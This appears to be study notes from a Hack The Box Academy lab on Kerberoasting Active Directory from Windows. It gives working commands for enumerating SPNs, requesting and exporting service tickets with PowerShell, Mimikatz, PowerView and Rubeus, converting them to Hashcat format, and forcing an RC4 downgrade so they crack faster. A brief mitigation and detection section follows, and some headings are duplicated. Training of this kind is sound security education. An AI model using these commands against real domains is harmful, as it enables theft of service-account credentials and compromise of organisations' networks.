## Table of Contents

  - [Table of Contents](#Table\of\Contents)
      - [Enumerating SPNs with setspn.exe](#Enumerating\SPNs\with\setspn.exe)
      - [Targeting a Single User](#Targeting\a\Single\User)
      - [Retrieving All Tickets Using setspn.exe](#Retrieving\All\Tickets\Using\setspn.exe)
  - [Extracting Tickets from Memory with Mimikatz](#Extracting\Tickets\from\Memory\with\Mimikatz)
      - [Preparing the Base64 Blob for Cracking](#Preparing\the\Base64\Blob\for\Cracking)
      - [Placing the Output into a File as .kirbi](#Placing\the\Output\into\a\File\as\.kirbi)
      - [Extracting the Kerberos Ticket using kirbi2john.py](#Extracting\the\Kerberos\Ticket\using\kirbi2john.py)
      - [Modifiying crack_file for Hashcat](#Modifiying\crack_file\for\Hashcat)
      - [Viewing the Prepared Hash](#Viewing\the\Prepared\Hash)
      - [Viewing the Prepared Hash](#Viewing\the\Prepared\Hash)
  - [Automated / Tool Based Route](#Automated\/\Tool\Based\Route)
      - [Using PowerView to Extract TGS Tickets](#Using\PowerView\to\Extract\TGS\Tickets)
      - [Using PowerView to Target a Specific User](#Using\PowerView\to\Target\a\Specific\User)
      - [Exporting All Tickets to a CSV File](#Exporting\All\Tickets\to\a\CSV\File)
      - [Viewing the Contents of the .CSV File](#Viewing\the\Contents\of\the\.CSV\File)
      - [Using Rubeus](#Using\Rubeus)
      - [Viewing Rubeus's Capabilities](#Viewing\Rubeus's\Capabilities)
      - [Using the /stats Flag](#Using\the\/stats\Flag)
      - [Using the /nowrap Flag](#Using\the\/nowrap\Flag)
  - [A Note on Encryption Types](#A\Note\on\Encryption\Types)
      - [Checking Supported Encryption Types](#Checking\Supported\Encryption\Types)
      - [Requesting a New Ticket](#Requesting\a\New\Ticket)
      - [Running Hashcat & Checking the Status of the Cracking Job](#Running\Hashcat\&\Checking\the\Status\of\the\Cracking\Job)
      - [Using the /tgtdeleg Flag](#Using\the\/tgtdeleg\Flag)
    - [Edit Kerberos Encryption Policies](#Edit\Kerberos\Encryption\Policies)
  - [Mitigation & Detection](#Mitigation\&\Detection)

## Table of Contents

      - [Enumerating SPNs with setspn.exe](#Enumerating\SPNs\with\setspn.exe)
      - [Targeting a Single User](#Targeting\a\Single\User)
      - [Retrieving All Tickets Using setspn.exe](#Retrieving\All\Tickets\Using\setspn.exe)
  - [Extracting Tickets from Memory with Mimikatz](#Extracting\Tickets\from\Memory\with\Mimikatz)
      - [Preparing the Base64 Blob for Cracking](#Preparing\the\Base64\Blob\for\Cracking)
      - [Placing the Output into a File as .kirbi](#Placing\the\Output\into\a\File\as\.kirbi)
      - [Extracting the Kerberos Ticket using kirbi2john.py](#Extracting\the\Kerberos\Ticket\using\kirbi2john.py)
      - [Modifiying crack_file for Hashcat](#Modifiying\crack_file\for\Hashcat)
      - [Viewing the Prepared Hash](#Viewing\the\Prepared\Hash)
      - [Viewing the Prepared Hash](#Viewing\the\Prepared\Hash)
  - [Automated / Tool Based Route](#Automated\/\Tool\Based\Route)
      - [Using PowerView to Extract TGS Tickets](#Using\PowerView\to\Extract\TGS\Tickets)
      - [Using PowerView to Target a Specific User](#Using\PowerView\to\Target\a\Specific\User)
      - [Exporting All Tickets to a CSV File](#Exporting\All\Tickets\to\a\CSV\File)
      - [Viewing the Contents of the .CSV File](#Viewing\the\Contents\of\the\.CSV\File)
      - [Using Rubeus](#Using\Rubeus)
      - [Viewing Rubeus's Capabilities](#Viewing\Rubeus's\Capabilities)
      - [Using the /stats Flag](#Using\the\/stats\Flag)
      - [Using the /nowrap Flag](#Using\the\/nowrap\Flag)
  - [A Note on Encryption Types](#A\Note\on\Encryption\Types)
      - [Checking Supported Encryption Types](#Checking\Supported\Encryption\Types)
      - [Requesting a New Ticket](#Requesting\a\New\Ticket)
      - [Running Hashcat & Checking the Status of the Cracking Job](#Running\Hashcat\&\Checking\the\Status\of\the\Cracking\Job)
      - [Using the /tgtdeleg Flag](#Using\the\/tgtdeleg\Flag)
    - [Edit Kerberos Encryption Policies](#Edit\Kerberos\Encryption\Policies)
  - [Mitigation & Detection](#Mitigation\&\Detection)


Before tools such as `Rubeus` existed, stealing or forging Kerberos tickets was a complex, manual process. As the tactic and defenses have evolved, we can now perform Kerberoasting from Windows in multiple ways. To start down this path, we will explore the manual route and then move into more automated tooling. Let's begin with the built-in [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) binary to enumerate SPNs in the domain.

#### Enumerating SPNs with setspn.exe

  Enumerating SPNs with setspn.exe

```cmd
C:\htb> setspn.exe -Q */*
```


We will notice many different SPNs returned for the various hosts in the domain. We will focus on `user accounts` and ignore the computer accounts returned by the tool. Next, using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using `Mimikatz`. Let's try this by targeting a single user:
#### Targeting a Single User

  Targeting a Single User

```powershell
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

```

Before moving on, let's break down the commands above to see what we are doing (which is essentially what is used by [Rubeus](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1) when using the default Kerberoasting method):
- The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
- The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
- [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services
- We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object
- We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session

We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.

#### Retrieving All Tickets Using setspn.exe

  Retrieving All Tickets Using setspn.exe

```powershell
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```


## Extracting Tickets from Memory with Mimikatz
```cmd
mimikatz # base64 /out:true


mimikatz # kerberos::list /export  
```
#### Preparing the Base64 Blob for Cracking

  Preparing the Base64 Blob for Cracking

```shell
gdxqpardo@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n 
```

We can place the above single line of output into a file and convert it back to a `.kirbi` file using the `base64` utility.

#### Placing the Output into a File as .kirbi

  Placing the Output into a File as .kirbi

```shell
gdxqpardo@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi
```

Next, we can use [this](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of the `kirbi2john.py` tool to extract the Kerberos ticket from the TGS file.

#### Extracting the Kerberos Ticket using kirbi2john.py

  Extracting the Kerberos Ticket using kirbi2john.py

```shell
gdxqpardo@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi
```

This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.

#### Modifiying crack_file for Hashcat

  Modifiying crack_file for Hashcat

```shell
gdxqpardo@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

#### Viewing the Prepared Hash

  Viewing the Prepared Hash

```shell
gdxqpardo@htb[/htb]$ cat sqldev_tgs_hashcat 

$krb5tgs$23$*sqldev.kirbi*$[-SNIP-]
...
```



#### Viewing the Prepared Hash

  Viewing the Prepared Hash

```bash
gdxqpardo@htb[/htb]$ cat sqldev_tgs_hashcat 

$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c9
....[-SNIP-]
```







---

## Automated / Tool Based Route

Next, we'll cover two much quicker ways to perform Kerberoasting from a Windows host. First, let's use [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) to extract the TGS tickets and convert them to Hashcat format. We can start by enumerating SPN accounts.

#### Using PowerView to Extract TGS Tickets
  
Using PowerView to Extract TGS Tickets

```powershell
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname
```

From here, we could target a specific user and retrieve the TGS ticket in Hashcat format.

#### Using PowerView to Target a Specific User

  Using PowerView to Target a Specific User

```powershell
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```


Finally, we can export all tickets to a CSV file for offline processing.

#### Exporting All Tickets to a CSV File

  Exporting All Tickets to a CSV File

```powershell
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

#### Viewing the Contents of the .CSV File

  Viewing the Contents of the .CSV File

```powershell
PS C:\htb> cat .\ilfreight_tgs.csv
```


#### Using Rubeus

  Using Rubeus

```powershell
PS C:\htb> .\Rubeus.exe
```

- Performing Kerberoasting and outputting hashes to a file
- Using alternate credentials
- Performing Kerberoasting combined with a pass-the-ticket attack
- Performing "opsec" Kerberoasting to filter out AES-enabled accounts
- Requesting tickets for accounts passwords set between a specific date range
- Placing a limit on the number of tickets requested
- Performing AES Kerberoasting

#### Viewing Rubeus's Capabilities
#### Using the /stats Flag

  Using the /stats Flag

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /stats
- statistics about target users. Domain, Path, kerberoastable, Supported Encryption Type

```


Let's use Rubeus to request tickets for accounts with the `admincount` attribute set to `1`. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the `/nowrap` flag so that the hash can be more easily copied down for offline cracking using Hashcat. Per the documentation, the ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.

#### Using the /nowrap Flag

  Using the /nowrap Flag

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

## A Note on Encryption Types

Kerberoasting tools typically request `RC4 encryption` when performing the attack and initiating TGS-REQ requests. This is because RC4 is [weaker](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, we will retrieve hashes that begin with `$krb5tgs$23$*`, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with `$krb5tgs$18$*`. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using [Hashcat](https://github.com/hashcat/hashcat/pull/1955), it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen. Let's walk through an example.

Let's start by creating an SPN account named `testspn` and using Rubeus to Kerberoast this specific user to test this out. As we can see, we received the TGS ticket RC4 (type 23) encrypted.

  
Using the /nowrap Flag

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap

[*] Hash  : $krb5tgs$23$*testspn$INLANEFREIGHT.LOCAL*$CEA71B221FC2C00F8
```

Checking with PowerView, we can see that the `msDS-SupportedEncryptionTypes` attribute is set to `0`. The chart [here](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) tells us that a decimal value of `0` means that a specific encryption type is not defined and set to the default of `RC4_HMAC_MD5`.

  Using the /nowrap Flag

```powershell
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

```


Let's assume that our client has set SPN accounts to support AES 128/256 encryption.

![image](https://academy.hackthebox.com/storage/modules/143/aes_kerberoast.png)

If we check this with PowerView, we'll see that the `msDS-SupportedEncryptionTypes attribute` is set to `24`, meaning that AES 128/256 encryption types are the only ones supported.

#### Checking Supported Encryption Types

  Checking Supported Encryption Types

```powershell
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

```


Requesting a new ticket with Rubeus will show us that the account name is using AES-256 (type 18) encryption.

#### Requesting a New Ticket

  Requesting a New Ticket

```powershell
PS C:\htb>  .\Rubeus.exe kerberoast /user:testspn /nowrap

[*] Total kerberoastable users : 1

[*] SamAccountName         : testspn
[*] DistinguishedName      : CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : testspn/kerberoast.inlanefreight.local
[*] PwdLastSet             : 2/27/2022 12:15:43 PM
[*] Supported ETypes       : AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
[*] Hash                   : $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$*testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL*$8939F8C5B.....[-SNIP-]
```

To run this through Hashcat, we need to use hash mode `19700`, which is `Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96)` per the handy Hashcat [example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) table. We run the AES hash as follows and check the status, which shows it should take over 23 minutes to run through the entire rockyou.txt wordlist by typing `s` to see the status of the cracking job.

#### Running Hashcat & Checking the Status of the Cracking Job

  Running Hashcat & Checking the Status of the Cracking Job

```shell-session
gdxqpardo@htb[/htb]$ hashcat -m 19700
```


We can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.

#### Using the /tgtdeleg Flag

![image](https://academy.hackthebox.com/storage/modules/143/kerb_tgs_18.png)

In the above image, we can see that when supplying the `/tgtdeleg` flag, the tool requested an RC4 ticket even though the supported encryption types are listed as AES 128/256. This simple example shows the importance of detailed enumeration and digging deeper when performing attacks such as Kerberoasting.  Here we could downgrade from AES to RC4 and cut cracking time down by over 4 minutes and 30 seconds. In a real-world engagement where we have a strong GPU password cracking rig at our disposal, this type of downgrade could result in a hash cracking in a few hours instead of a few days and could make and break our assessment.


### Edit Kerberos Encryption Policies
It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options`, then double-clicking on `Network security: Configure encryption types allowed for Kerberos` and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for `RC4_HMAC_MD5` would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done

## Mitigation & Detection

An important mitigation for non-managed service accounts is to set a long and complex password or passphrase that does not appear in any word list and would take far too long to crack. However, it is recommended to use [Managed Service Accounts (MSA)](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009), and [Group Managed Service Accounts (gMSA)](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), which use very complex passwords, and automatically rotate on a set interval (like machine accounts) or accounts set up with LAPS.

Kerberoasting requests Kerberos TGS tickets with RC4 encryption, which should not be the majority of Kerberos activity within a domain. When Kerberoasting is occurring in the environment, we will see an abnormal number of `TGS-REQ` and `TGS-REP` requests and responses, signaling the use of automated Kerberoasting tools. Domain controllers can be configured to log Kerberos TGS ticket requests by selecting [Audit Kerberos Service Ticket Operations](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations) within Group Policy.

